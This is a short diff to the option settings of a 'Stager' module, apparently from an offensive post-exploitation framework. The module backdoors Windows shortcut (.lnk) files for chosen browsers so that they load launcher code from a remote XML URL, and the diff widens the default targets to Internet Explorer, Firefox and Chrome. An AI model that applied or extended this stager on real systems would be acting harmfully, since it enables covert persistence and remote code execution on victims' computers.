@@ -36,7 +36,7 @@ class Stager:
 	    'TargetEXEs' : {
                 'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
                 'Required'      :   True,
-                'Value'         :   'iexplore'
+                'Value'         :   'iexplore,firefox,chrome'
             },
             'XmlUrl' : {
                 'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
